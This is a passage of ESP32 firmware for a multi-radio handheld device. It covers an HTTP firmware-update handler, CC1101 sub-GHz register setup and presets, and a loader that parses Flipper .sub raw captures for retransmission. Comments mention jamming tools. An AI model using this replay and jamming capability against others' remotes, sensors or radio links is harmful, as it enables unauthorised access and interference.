</html>)HTML");
                client.print("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n");
                client.print(html);
            } else if (isFavicon) {
                client.print("HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n");
            } else if (isUpdate && contentLength > 0) {
                wirelessUpdateStatus = "Receiving update";
                wirelessUpdateNeedsRedraw = true;

                bool ok = Update.begin(contentLength);
                size_t remaining = (size_t)contentLength;
                uint8_t buffer[512];
                unsigned long lastDataAt = millis();
                unsigned long lastProgressAt = 0;

                while (ok && remaining > 0 && client.connected()) {
                    int availableBytes = client.available();
                    if (availableBytes <= 0) {
                        if (millis() - lastDataAt > 10000UL) {
                            ok = false;
                            break;
                        }
                        delay(1);
                        yield();
                        continue;
                    }

                    size_t toRead = min((size_t)availableBytes, min(sizeof(buffer), remaining));
                    int bytesRead = client.read(buffer, toRead);
                    if (bytesRead <= 0) {
                        continue;
                    }

                    if (Update.write(buffer, bytesRead) != (size_t)bytesRead) {
                        ok = false;
                        break;
                    }

                    remaining -= (size_t)bytesRead;
                    lastDataAt = millis();

                    if (millis() - lastProgressAt >= 250UL) {
                        uint8_t pct = (contentLength > 0) ? (uint8_t)(((contentLength - remaining) * 100UL) / (unsigned long)contentLength) : 0;
                        wirelessUpdateStatus = String("Updating ") + String(pct) + "%";
                        wirelessUpdateNeedsRedraw = true;
                        lastProgressAt = millis();
                    }
                }

                ok = ok && (remaining == 0) && Update.end(true);
                wirelessUpdateStatus = ok ? "Update complete" : "Update failed";
                wirelessUpdateNeedsRedraw = true;

                client.print("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n");
                client.print(ok ? "Update complete. Restarting..." : "Update failed.");
                client.flush();
                client.stop();

                if (ok) {
                    delay(500);
                    ESP.restart();
                }
                return;
            } else {
                client.print("HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nBad request");
            }

            client.flush();
            client.stop();
        }
    }
    if (wirelessUpdateNeedsRedraw) {
        wirelessUpdateNeedsRedraw = false;
        drawWirelessUpdateScreen();
    }
}

void restoreDisplayAfterStorageAccess() {
    primeSharedSPIBus();
    displayUpdatesSuspended = false;
    SPI.end();
    delay(1);
    SPI.begin(18, 19, 23);
    pinMode(TFT_CS, OUTPUT);
    pinMode(SD_CS, OUTPUT);
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    digitalWrite(CC1101_CS, HIGH);
    digitalWrite(TFT_CS, HIGH);
    if (startupSequenceActive) {
        return;
    }
    tft.fillRect(0, 0, 240, 320, ILI9341_BLACK);
    markCurrentScreenForRedraw();
}

void restoreDisplayAfterCriticalStorageFailure() {
    displayUpdatesSuspended = false;
    primeSharedSPIBus();
    SPI.end();
    delay(4);
    SPI.begin(18, 19, 23);
    delay(4);
    pinMode(TFT_CS, OUTPUT);
    pinMode(TFT_DC, OUTPUT);
    pinMode(SD_CS, OUTPUT);
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    digitalWrite(CC1101_CS, HIGH);
    digitalWrite(TFT_CS, HIGH);
    delay(4);
    tft.begin();
    tft.setRotation(2);
    if (startupSequenceActive) {
        return;
    }
    tft.fillScreen(ILI9341_BLACK);
    drawStatusBar();
    markCurrentScreenForRedraw();
}

void restoreDisplayAfterHeavyStorageAccess() {
    primeSharedSPIBus();
    displayUpdatesSuspended = false;
    SPI.end();
    delay(2);
    SPI.begin(18, 19, 23);
    delay(2);
    pinMode(TFT_CS, OUTPUT);
    pinMode(TFT_DC, OUTPUT);
    pinMode(TFT_RST, OUTPUT);
    pinMode(SD_CS, OUTPUT);
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    digitalWrite(CC1101_CS, HIGH);
    digitalWrite(TFT_RST, HIGH);
    digitalWrite(TFT_CS, HIGH);
    delay(4);
    tft.begin();
    tft.setRotation(2);
    if (startupSequenceActive) {
        return;
    }
    tft.fillScreen(ILI9341_BLACK);
    drawStatusBar();
    markCurrentScreenForRedraw();
}

void logActiveMode() {
    switch (activeMode) {
        case ACTIVE_WIFI: LOG("Active Mode: Sweep"); break;
        case ACTIVE_FULL: LOG("Active Mode: Step"); break;
        case ACTIVE_BLE:  LOG("Active Mode: Sweep"); break;
        case ACTIVE_AUTO: LOG("Active Mode: Sweep"); break;
    }
}

void logChannel(byte ch) {
    LOG(String("Channel → ") + ch);
}

void claimRadio2ControlPin() {
    if (NRF24_RADIO2_CE == BTN_RIGHT) {
        pinMode(BTN_RIGHT, OUTPUT);
        digitalWrite(BTN_RIGHT, LOW);
    }
}

void restoreRadio2ControlPin() {
    if (NRF24_RADIO2_CE == BTN_RIGHT) {
        pinMode(BTN_RIGHT, INPUT_PULLUP);
    }
}

void primeSharedSPIBus() {
    pinMode(NRF24_RADIO1_CE, OUTPUT);
    pinMode(NRF24_RADIO2_CE, OUTPUT);
    pinMode(NRF24_RADIO1_CSN, OUTPUT);
    pinMode(NRF24_RADIO2_CSN, OUTPUT);
    pinMode(CC1101_CS, OUTPUT);
    pinMode(SD_CS, OUTPUT);
    pinMode(TFT_CS, OUTPUT);

    digitalWrite(NRF24_RADIO1_CE, LOW);
    digitalWrite(NRF24_RADIO2_CE, LOW);
    digitalWrite(NRF24_RADIO1_CSN, HIGH);
    digitalWrite(NRF24_RADIO2_CSN, HIGH);
    digitalWrite(CC1101_CS, HIGH);
    digitalWrite(SD_CS, HIGH);
    digitalWrite(TFT_CS, HIGH);
}

void reserveRuntimeStringCapacity() {
    // bleFocusedName and bleFocusedMAC are now char arrays, no reserve needed
    bleLoggerTargetName.reserve(32);
    bleLoggerTargetMAC.reserve(20);
    bleBeaconStatus.reserve(24);
    bleBeaconName.reserve(32);
    bleBeaconVendor.reserve(24);
    bleBeaconUUID.reserve(48);
    bleBeaconAddress.reserve(20);
    bleDeviceStatus.reserve(24);
    bleDeviceAddrMode.reserve(16);
    bleDeviceName.reserve(32);
    bleDeviceVendor.reserve(24);
    bleDeviceUUID.reserve(48);
    bleDeviceAddress.reserve(20);
    bleBeaconTestStatus.reserve(24);
    bleBeaconTestName.reserve(32);
    bleBeaconTestVendor.reserve(24);
    bleBeaconTestUUID.reserve(48);
    bleBeaconTestAddress.reserve(20);
    bleBeaconTestAddrMode.reserve(16);
    rfCaptureStatus.reserve(24);
    rfSubLoadedPath.reserve(96);
    rfSubLoadedName.reserve(48);
    rfSubPreset.reserve(40);
    rfTransmitStatus.reserve(24);
    fileManagerPath.reserve(96);
    fileDetailPath.reserve(96);
    fileDetailSavedText.reserve(24);
    fileTextViewerContent.reserve(2048);
    fileRenamePath.reserve(96);
    fileRenameDraft.reserve(48);
    fileRenameExtension.reserve(16);
    fileRenameStatus.reserve(32);
    currentTitle.reserve(24);
    targetSSID.reserve(34);

    for (int i = 0; i < MAX_SCAN_RESULTS; i++) {
        bleNames[i][0] = 0;
        bleMACs[i][0] = 0;

        if ((i & 0x03) == 0x03) {
            yield();
        }
    }

    for (int i = 0; i < BLE_RADAR_MAX_DEVICES; i++) {
        bleRadarKnownMACs[i].reserve(20);
    }

    for (int i = 0; i < FILE_MANAGER_MAX_ENTRIES; i++) {
        fileManagerEntries[i].reserve(40);
        fileManagerFullPaths[i].reserve(96);

        if ((i & 0x07) == 0x07) {
            yield();
        }
    }
}

bool cc1101SelectReady() {
    // Ensure all other CS lines are deselected before starting a CC1101 transaction
    digitalWrite(NRF24_RADIO1_CSN, HIGH);
    digitalWrite(NRF24_RADIO2_CSN, HIGH);
    digitalWrite(SD_CS, HIGH);
    digitalWrite(TFT_CS, HIGH);
    SPI.beginTransaction(SPISettings(CC1101_SPI_HZ, MSBFIRST, SPI_MODE0));
    digitalWrite(CC1101_CS, LOW);

    // Wait for MISO (GPIO19) to go LOW — CC1101 signals ready by pulling MISO low
    uint32_t start = micros();
    while (digitalRead(19) == HIGH && micros() - start < 2000) {
    }

    return digitalRead(19) == LOW;
}

void cc1101Deselect() {
    digitalWrite(CC1101_CS, HIGH);
    SPI.endTransaction();
}

void cc1101WriteReg(uint8_t reg, uint8_t value) {
    if (!cc1101SelectReady()) {
        cc1101Deselect();
        return;
    }

    SPI.transfer(reg);
    SPI.transfer(value);
    cc1101Deselect();
}

void cc1101WriteBurst(uint8_t reg, const uint8_t* data, size_t len) {
    if (!cc1101SelectReady()) {
        cc1101Deselect();
        return;
    }

    SPI.transfer(reg | CC1101_WRITE_BURST);
    for (size_t i = 0; i < len; i++) {
        SPI.transfer(data[i]);
    }
    cc1101Deselect();
}

// Burst read from a status/FIFO register (uses READ_BURST access type)
void cc1101ReadBurstStatus(uint8_t reg, uint8_t* buf, uint8_t len) {
    if (!cc1101SelectReady()) { cc1101Deselect(); return; }
    SPI.transfer(reg | CC1101_READ_BURST);
    for (uint8_t i = 0; i < len; i++) buf[i] = SPI.transfer(0x00);
    cc1101Deselect();
}

uint8_t cc1101ReadReg(uint8_t reg) {
    if (!cc1101SelectReady()) {
        cc1101Deselect();
        return 0xFF;
    }

    SPI.transfer(reg | CC1101_READ_SINGLE);
    uint8_t value = SPI.transfer(0x00);
    cc1101Deselect();
    return value;
}

uint8_t cc1101ReadStatusReg(uint8_t reg) {
    if (!cc1101SelectReady()) {
        cc1101Deselect();
        return 0xFF;
    }

    SPI.transfer(reg | CC1101_READ_BURST);
    uint8_t value = SPI.transfer(0x00);
    cc1101Deselect();
    return value;
}

uint8_t cc1101Strobe(uint8_t command) {
    if (!cc1101SelectReady()) {
        cc1101Deselect();
        return 0xFF;
    }

    uint8_t status = SPI.transfer(command);
    cc1101Deselect();
    return status;
}

bool cc1101ResetChip() {
    primeSharedSPIBus();
    SPI.end();
    delay(2);
    SPI.begin(18, 19, 23);
    delay(2);
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(5);
    digitalWrite(CC1101_CS, LOW);
    delayMicroseconds(10);
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(45);

    if (!cc1101SelectReady()) {
        cc1101Deselect();
        return false;
    }

    SPI.transfer(CC1101_SRES);

    uint32_t start = micros();
    while (digitalRead(19) == HIGH && micros() - start < 5000) {
    }

    cc1101Deselect();
    delay(2);

    cc1101Version = cc1101ReadStatusReg(CC1101_VERSION);
    return cc1101Version != 0x00 && cc1101Version != 0xFF;
}

// ===== CC1101 PRESET CONFIGURATION =====
void cc1101ApplyPreset(const String& preset) {
    String p = preset; p.toLowerCase();
    if (p.indexOf("ook270") >= 0) {
        cc1101WriteReg(CC1101_MDMCFG4, 0xD7);
        cc1101WriteReg(CC1101_MDMCFG3, 0x91);
        cc1101WriteReg(CC1101_MDMCFG2, 0x30);
        cc1101WriteReg(CC1101_MDMCFG1, 0x00);
        cc1101WriteReg(CC1101_MDMCFG0, 0x00);
        cc1101WriteReg(CC1101_FREND0,  0x11);
    } else if (p.indexOf("ook650") >= 0) {
        cc1101WriteReg(CC1101_MDMCFG4, 0xCA);
        cc1101WriteReg(CC1101_MDMCFG3, 0x83);
        cc1101WriteReg(CC1101_MDMCFG2, 0x30);
        cc1101WriteReg(CC1101_MDMCFG1, 0x00);
        cc1101WriteReg(CC1101_MDMCFG0, 0x00);
        cc1101WriteReg(CC1101_FREND0,  0x11);
    } else if (p.indexOf("2fsk") >= 0 && p.indexOf("dev238") >= 0) {
        // FuriHalSubGhzPreset2FSKDev238Async — common in Flipper door sensors
        cc1101WriteReg(CC1101_MDMCFG4, 0xC8);
        cc1101WriteReg(CC1101_MDMCFG3, 0x93);
        cc1101WriteReg(CC1101_MDMCFG2, 0x00);  // 2-FSK, no sync
        cc1101WriteReg(CC1101_MDMCFG1, 0x22);
        cc1101WriteReg(CC1101_MDMCFG0, 0xF8);
        cc1101WriteReg(CC1101_DEVIATN, 0x34);  // 238kHz deviation
        cc1101WriteReg(CC1101_FREND0,  0x10);
    } else if (p.indexOf("2fsk") >= 0 && p.indexOf("dev476") >= 0) {
        // FuriHalSubGhzPreset2FSKDev476Async
        cc1101WriteReg(CC1101_MDMCFG4, 0xC8);
        cc1101WriteReg(CC1101_MDMCFG3, 0x93);
        cc1101WriteReg(CC1101_MDMCFG2, 0x00);
        cc1101WriteReg(CC1101_MDMCFG1, 0x22);
        cc1101WriteReg(CC1101_MDMCFG0, 0xF8);
        cc1101WriteReg(CC1101_DEVIATN, 0x47);  // 476kHz deviation
        cc1101WriteReg(CC1101_FREND0,  0x10);
    } else if (p.indexOf("2fsk") >= 0 && p.indexOf("2k") >= 0) {
        cc1101WriteReg(CC1101_MDMCFG4, 0xF5);
        cc1101WriteReg(CC1101_MDMCFG3, 0x83);
        cc1101WriteReg(CC1101_MDMCFG2, 0x00);
        cc1101WriteReg(CC1101_MDMCFG1, 0x22);
        cc1101WriteReg(CC1101_MDMCFG0, 0xF8);
        cc1101WriteReg(CC1101_DEVIATN, 0x15);
        cc1101WriteReg(CC1101_FREND0,  0x10);
    } else if (p.indexOf("2fsk") >= 0 && p.indexOf("47k") >= 0) {
        cc1101WriteReg(CC1101_MDMCFG4, 0xC8);
        cc1101WriteReg(CC1101_MDMCFG3, 0x93);
        cc1101WriteReg(CC1101_MDMCFG2, 0x00);
        cc1101WriteReg(CC1101_MDMCFG1, 0x22);
        cc1101WriteReg(CC1101_MDMCFG0, 0xF8);
        cc1101WriteReg(CC1101_DEVIATN, 0x47);
        cc1101WriteReg(CC1101_FREND0,  0x10);
    } else {
        // Default OOK 650kHz — covers most 315/433/868/915 remotes
        cc1101WriteReg(CC1101_MDMCFG4, 0xCA);
        cc1101WriteReg(CC1101_MDMCFG3, 0x83);
        cc1101WriteReg(CC1101_MDMCFG2, 0x30);
        cc1101WriteReg(CC1101_MDMCFG1, 0x00);
        cc1101WriteReg(CC1101_MDMCFG0, 0x00);
        cc1101WriteReg(CC1101_FREND0,  0x11);
    }
}

void cc1101EnterRx() {
    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(50);    // brief SIDLE settle before flushing FIFOs
    cc1101Strobe(CC1101_SFRX);
    cc1101Strobe(CC1101_SFTX);
    cc1101Strobe(CC1101_SRX);
    delayMicroseconds(150);   // SRX settle — calibration settle is handled by caller
}

float cc1101ApplyFrequencyCorrection(float mhz) {
    float requestedMHz = constrain(mhz, 300.0f, 928.0f);
    return constrain(requestedMHz * (1.0f + (CC1101_FREQ_CORRECTION_PPM / 1000000.0f)), 300.0f, 928.0f);
}

void cc1101SetFrequencyMHz(float mhz) {
    float requestedMHz = constrain(mhz, 300.0f, 928.0f);
    float correctedMHz = cc1101ApplyFrequencyCorrection(requestedMHz);
    uint32_t freqWord = (uint32_t)((correctedMHz * 65536.0f / 26.0f) + 0.5f);

    cc1101Strobe(CC1101_SIDLE);
    cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
    cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
    cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);
    cc1101Strobe(CC1101_SCAL);
    delayMicroseconds(720);   // SCAL takes ~720µs — wait before entering RX
    cc1101EnterRx();

    cc1101CurrentMHz = requestedMHz;
}

void cc1101SetFrequencyMHzQuick(float mhz) {
    float requestedMHz = constrain(mhz, 300.0f, 928.0f);
    float correctedMHz = cc1101ApplyFrequencyCorrection(requestedMHz);
    uint32_t freqWord = (uint32_t)((correctedMHz * 65536.0f / 26.0f) + 0.5f);

    cc1101Strobe(CC1101_SIDLE);
    cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
    cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
    cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);
    cc1101Strobe(CC1101_SRX);
    delayMicroseconds(100);   // synthesizer lock ~88µs, no SCAL needed

    cc1101CurrentMHz = requestedMHz;
}

void cc1101ConfigureBase() {
    const uint8_t paTableValue = 0xC0;

    cc1101WriteReg(CC1101_IOCFG2, 0x29);
    cc1101WriteReg(CC1101_IOCFG1, 0x2E);
    cc1101WriteReg(CC1101_IOCFG0, 0x0D);
    cc1101WriteReg(CC1101_FIFOTHR, 0x47);
    cc1101WriteReg(CC1101_PKTLEN, 0x3D);
    cc1101WriteReg(CC1101_PKTCTRL1, 0x04);
    cc1101WriteReg(CC1101_PKTCTRL0, 0x05);
    cc1101WriteReg(CC1101_FSCTRL1, 0x06);
    cc1101WriteReg(CC1101_FSCTRL0, 0x00);
    cc1101WriteReg(CC1101_MDMCFG4, 0xCA);
    cc1101WriteReg(CC1101_MDMCFG3, 0x83);
    cc1101WriteReg(CC1101_MDMCFG2, 0x13);
    cc1101WriteReg(CC1101_MDMCFG1, 0x22);
    cc1101WriteReg(CC1101_MDMCFG0, 0xF8);
    cc1101WriteReg(CC1101_DEVIATN, 0x34);
    cc1101WriteReg(CC1101_MCSM2, 0x07);
    cc1101WriteReg(CC1101_MCSM1, 0x30);
    cc1101WriteReg(CC1101_MCSM0, 0x18);
    cc1101WriteReg(CC1101_FOCCFG, 0x16);
    cc1101WriteReg(CC1101_BSCFG, 0x6C);
    // AGC: max LNA gain (0x07) for best RX sensitivity in scanner/monitor modes
    cc1101WriteReg(CC1101_AGCCTRL2, 0x07);
    cc1101WriteReg(CC1101_AGCCTRL1, 0x00);
    cc1101WriteReg(CC1101_AGCCTRL0, 0x91);
    cc1101WriteReg(CC1101_FREND1, 0x56);
    cc1101WriteReg(CC1101_FREND0, 0x10);
    cc1101WriteReg(CC1101_FSCAL3, 0xE9);
    cc1101WriteReg(CC1101_FSCAL2, 0x2A);
    cc1101WriteReg(CC1101_FSCAL1, 0x00);
    cc1101WriteReg(CC1101_FSCAL0, 0x1F);
    cc1101WriteReg(CC1101_TEST2, 0x81);
    cc1101WriteReg(CC1101_TEST1, 0x35);
    cc1101WriteReg(CC1101_TEST0, 0x09);
    cc1101WriteBurst(CC1101_PATABLE, &paTableValue, 1);
    cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
    cc1101Configured = true;
}

int cc1101ReadRSSI() {
    uint8_t raw = cc1101ReadStatusReg(CC1101_RSSI);
    if (raw == 0xFF) {
        return -120;
    }

    // CC1101 datasheet formula: RSSI_dBm = (RSSI_dec >= 128) ? (RSSI_dec - 256)/2 - 74 : RSSI_dec/2 - 74
    int value = (raw >= 128) ? (raw - 256) : raw;
    return (value / 2) - 74;
}

bool probeCC1101Chip(bool configureAfter) {
    cc1101LastProbeAttemptMs = millis();
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    pinMode(CC1101_GDO0, INPUT);  // GDO0 starts as input (RX data)
    bool ok = false;
    for (uint8_t attempt = 0; attempt < 3 && !ok; attempt++) {
        ok = cc1101ResetChip();
        if (!ok) {
            rfDiagLog(String("CC1101 reset retry ") + String((int)attempt + 1));
            delay(4);
        }
    }
    cc1101Ok = ok;
    cc1101PreparedPassiveMode = -1;
    cc1101PreparedPassiveMHz = -1.0f;

    if (ok && configureAfter) {
        cc1101ConfigureBase();
        cc1101LastReadyMs = millis();
    } else if (!ok) {
        cc1101Configured = false;
        cc1101LastReadyMs = 0;
    }

    rfDiagLog(String("CC1101 probe ") + (ok ? "OK" : "FAIL") +
              " version=0x" + String(cc1101Version, HEX) +
              " configureAfter=" + String(configureAfter ? "1" : "0"));

    refreshDiagnosticsStatus();

    return ok;
}

bool ensureCC1101Ready() {
    if (!cc1101Ok || !cc1101Configured) {
        if (!cc1101Ok && millis() - cc1101LastProbeAttemptMs < 250UL) {
            return false;
        }
        rfDiagLog(String("CC1101 reprobe requested ok=") + (cc1101Ok ? "1" : "0") +
                  " configured=" + (cc1101Configured ? "1" : "0"));
        return probeCC1101Chip(true);
    }

    if (cc1101PreparedPassiveMode == currentRadioMode && cc1101PreparedPassiveMode != -1) {
        cc1101LastReadyMs = millis();
        return true;
    }

    if (millis() - cc1101LastReadyMs < 500UL) {
        return true;
    }

    primeSharedSPIBus();
    uint8_t version = cc1101ReadStatusReg(CC1101_VERSION);
    if (version == 0x00 || version == 0xFF) {
        delayMicroseconds(80);
        primeSharedSPIBus();
        version = cc1101ReadStatusReg(CC1101_VERSION);
    }
    if (version == 0x00 || version == 0xFF) {
        cc1101Ok = false;
        cc1101Configured = false;
        cc1101PreparedPassiveMode = -1;
        cc1101PreparedPassiveMHz = -1.0f;
        refreshDiagnosticsStatus();
        rfDiagLog(String("CC1101 version check failed read=0x") + String(version, HEX) + " -> reprobe");
        if (millis() - cc1101LastProbeAttemptMs < 250UL) {
            return false;
        }
        return probeCC1101Chip(true);
    }

    cc1101Version = version;
    cc1101LastReadyMs = millis();
    return true;
}

bool prepareCC1101PassiveTool(float tuneMHz, bool forceReconfigure) {
    // On a first-draw refresh we are about to fully re-prepare the chip anyway,
    // so skip the brittle live version read and go straight into passive setup
    // if the last known probe/config state was healthy.
    bool canTrustForcedRefresh = forceReconfigure && cc1101Ok && cc1101Configured;
    if (!canTrustForcedRefresh && !ensureCC1101Ready()) {
        rfDiagLog("Passive prep aborted: CC1101 not ready");
        return false;
    }

    float targetMHz = (tuneMHz > 0.0f) ? tuneMHz : rfLockedFrequencyMHz;
    bool needsRefresh = forceReconfigure ||
                        cc1101PreparedPassiveMode != currentRadioMode ||
                        fabsf(cc1101PreparedPassiveMHz - targetMHz) > 0.0005f;

    if (!needsRefresh) {
        cc1101LastReadyMs = millis();
        return true;
    }

    rfDiagLog(String("Passive prep mode=") + String(currentRadioMode) +
              " freq=" + String(targetMHz, 3) +
              " force=" + (forceReconfigure ? "1" : "0"));

    primeSharedSPIBus();
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    pinMode(CC1101_GDO0, INPUT);

    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);
    cc1101ConfigureBase();
    if (fabsf(targetMHz - rfLockedFrequencyMHz) > 0.0005f) {
        cc1101SetFrequencyMHz(targetMHz);
    } else {
        cc1101EnterRx();
        cc1101CurrentMHz = rfLockedFrequencyMHz;
    }

    cc1101PreparedPassiveMode = currentRadioMode;
    cc1101PreparedPassiveMHz = targetMHz;
    cc1101Ok = true;
    cc1101Configured = true;
    cc1101LastReadyMs = millis();
    rfDiagLog(String("Passive prep ready marc=0x") + String(cc1101ReadStatusReg(CC1101_MARCSTATE), HEX) +
              " rssi=" + String(cc1101ReadRSSI()));
    refreshDiagnosticsStatus();
    return true;
}

bool prepareCC1101ActiveTool(const char* contextLabel, bool forceReconfigure) {
    // Active CC1101 tools like transmit/jam/squelch should not keep reusing the
    // passive RX preparation path. That path retunes and re-enters RX, which
    // fights active TX-style tools and makes the UI look broken even when the
    // radio itself is healthy.
    bool canTrustForcedRefresh = forceReconfigure && cc1101Ok && cc1101Configured;
    if (!canTrustForcedRefresh && !cc1101Ok) {
        if (!ensureCC1101Ready()) {
            rfDiagLog(String(contextLabel ? contextLabel : "CC1101 active") + " prep aborted: CC1101 not ready");
            return false;
        }
    }

    if (!forceReconfigure) {
        cc1101LastReadyMs = millis();
        return true;
    }

    rfDiagLog(String("Active prep mode=") + String(currentRadioMode) +
              " tool=" + String(contextLabel ? contextLabel : "active") +
              " freq=" + String(rfLockedFrequencyMHz, 3));

    primeSharedSPIBus();
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    pinMode(CC1101_GDO0, INPUT);

    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);
    cc1101ConfigureBase();
    cc1101SetFrequencyMHz(rfLockedFrequencyMHz);

    // Active tools manage their own mode afterwards, so clear passive-tracking
    // markers instead of pretending we are still in a passive RX profile.
    cc1101PreparedPassiveMode = -1;
    cc1101PreparedPassiveMHz = -1.0f;
    cc1101Ok = true;
    cc1101Configured = true;
    cc1101LastReadyMs = millis();
    rfDiagLog(String("Active prep ready marc=0x") + String(cc1101ReadStatusReg(CC1101_MARCSTATE), HEX) +
              " rssi=" + String(cc1101ReadRSSI()));
    refreshDiagnosticsStatus();
    return true;
}

float getCurrentRFBandStart() {
    return rfBandPresets[rfBandIndex].startMHz;
}

float getCurrentRFBandEnd() {
    return rfBandPresets[rfBandIndex].endMHz;
}

void setRFBandForFrequency(float mhz) {
    int bestIndex = 0;
    float bestDistance = 100000.0f;

    for (int i = 0; i < rfBandPresetCount; i++) {
        if (mhz >= rfBandPresets[i].startMHz && mhz <= rfBandPresets[i].endMHz) {
            bestIndex = i;
            bestDistance = 0.0f;
            break;
        }

        float distance = fabsf(rfBandPresets[i].centerMHz - mhz);
        if (distance < bestDistance) {
            bestDistance = distance;
            bestIndex = i;
        }
    }

    rfBandIndex = bestIndex;
    rfLockedFrequencyMHz = mhz;
}

bool ensureRFSubBuffer() {
    return rfSubTimings != nullptr;
}

void clearLoadedSubFile() {
    rfSubLoaded = false;
    rfSubLoadedPath = "";
    rfSubLoadedName = "";
    rfSubPreset = "FuriHalSubGhzPresetOok650Async";
    rfSubFrequencyHz = (uint32_t)(rfLockedFrequencyMHz * 1000000.0f);
    rfSubPulseCount = 0;
    // Free dynamic buffer and reset pointer to static fallback
    if (rfSubDynamicBuf != nullptr) {
        free(rfSubDynamicBuf);
        rfSubDynamicBuf = nullptr;
    }
    rfSubTimings = rfSubTimingStorage;
    rfTransmitStatus = "Manual mode";
    rfTransmitStatusUntil = millis() + 1400;
}

bool loadSubFileForTransmit(const String& path) {
    String lowerPath = path;
    lowerPath.toLowerCase();
    if (!validateSDReady(false) || !lowerPath.endsWith(".sub") || !ensureRFSubBuffer()) {
        return false;
    }

    beginSPIOperation(true);
    File file = SD.open(path.c_str(), FILE_READ);
    if (!file) { delay(5); yield(); file = SD.open(path.c_str(), FILE_READ); }
    if (!file) { endSPIOperation(true, false); return false; }

    bool isRawProtocol = false;
    bool hasHeader = false;
    int pulseCount = 0;
    uint32_t parsedFrequency = 433920000UL;
    String parsedPreset = "FuriHalSubGhzPresetOok650Async";
    bool sawStructuredField = false;

    // ---- Pass 1: count pulses and read metadata ----
    int parsedLineCount = 0;
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) { parsedLineCount++; continue; }

        String lowerLine = line;
        lowerLine.toLowerCase();
        if (parsedLineCount == 0 && lowerLine.startsWith("\xEF\xBB\xBF")) {
            line = line.substring(3); lowerLine = lowerLine.substring(3);
        }

        if (lowerLine.startsWith("filetype:")) {
            hasHeader = lowerLine.indexOf("flipper subghz") >= 0;
            sawStructuredField = true;
        } else if (lowerLine.startsWith("frequency:")) {
            String v = line.substring(line.indexOf(':') + 1); v.trim();
            parsedFrequency = (uint32_t)v.toInt();
            sawStructuredField = true;
        } else if (lowerLine.startsWith("preset:")) {
            parsedPreset = line.substring(line.indexOf(':') + 1); parsedPreset.trim();
            sawStructuredField = true;
        } else if (lowerLine.startsWith("protocol:")) {
            String v = line.substring(line.indexOf(':') + 1); v.trim();
            isRawProtocol = v.equalsIgnoreCase("RAW");
            sawStructuredField = true;
        } else if (lowerLine.startsWith("raw_data:")) {
            String data = line.substring(line.indexOf(':') + 1);
            data.trim(); data.replace('\t', ' '); data.replace(',', ' ');
            int s = 0;
            while (s < (int)data.length()) {
                while (s < (int)data.length() && data[s] == ' ') s++;
                if (s >= (int)data.length()) break;
                int e = s;
                while (e < (int)data.length() && data[e] != ' ') e++;
                long pulse = data.substring(s, e).toInt();
                if (pulse != 0) {
                    long rem = pulse;
                    while (rem != 0) {
                        long chunk = rem;
                        if (rem > RF_SUB_PULSE_CHUNK_LIMIT) chunk = RF_SUB_PULSE_CHUNK_LIMIT;
                        else if (rem < -RF_SUB_PULSE_CHUNK_LIMIT) chunk = -RF_SUB_PULSE_CHUNK_LIMIT;
                        pulseCount++;
                        rem -= chunk;
                    }
                }
                s = e + 1;
            }
        }
        parsedLineCount++;
        if ((parsedLineCount & 0x0F) == 0x0F) yield();
    }

    if (!isRawProtocol || pulseCount == 0 || (!hasHeader && !sawStructuredField)) {
        LOG("FILE .sub parse fail pulses=" + String(pulseCount));
        file.close(); endSPIOperation(true, false); return false;
    }

    // ---- Allocate dynamic buffer ----
    if (rfSubDynamicBuf != nullptr) { free(rfSubDynamicBuf); rfSubDynamicBuf = nullptr; }
    int allocCount = pulseCount;
    rfSubDynamicBuf = (int16_t*)heap_caps_malloc((size_t)allocCount * sizeof(int16_t), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (rfSubDynamicBuf) {
        rfSubTimings = rfSubDynamicBuf;
    } else {
        allocCount = min(pulseCount, 8192);
        rfSubDynamicBuf = (int16_t*)malloc((size_t)allocCount * sizeof(int16_t));
        if (rfSubDynamicBuf) {
            rfSubTimings = rfSubDynamicBuf;
            LOG("Sub buf using internal heap");
        } else {
            // fallback to static buffer
            rfSubTimings = rfSubTimingStorage;
            allocCount = RF_SUB_MAX_PULSES;
            LOG("Sub buf alloc failed, using static");
        }
    }

    // ---- Pass 2: fill buffer ----
    file.seek(0);
    int filled = 0;
    bool truncated = (pulseCount > allocCount);
    parsedLineCount = 0;
    while (file.available() && filled < allocCount) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) { parsedLineCount++; continue; }
        String lowerLine = line; lowerLine.toLowerCase();
        if (!lowerLine.startsWith("raw_data:")) { parsedLineCount++; continue; }

        String data = line.substring(line.indexOf(':') + 1);
        data.trim(); data.replace('\t', ' '); data.replace(',', ' ');
        int s = 0, tokenCount = 0;
        while (s < (int)data.length() && filled < allocCount) {
            while (s < (int)data.length() && data[s] == ' ') s++;
            if (s >= (int)data.length()) break;
            int e = s;
            while (e < (int)data.length() && data[e] != ' ') e++;
            long pulse = data.substring(s, e).toInt();
            if (pulse != 0) {
                long rem = pulse;
                while (rem != 0 && filled < allocCount) {
                    long chunk = rem;
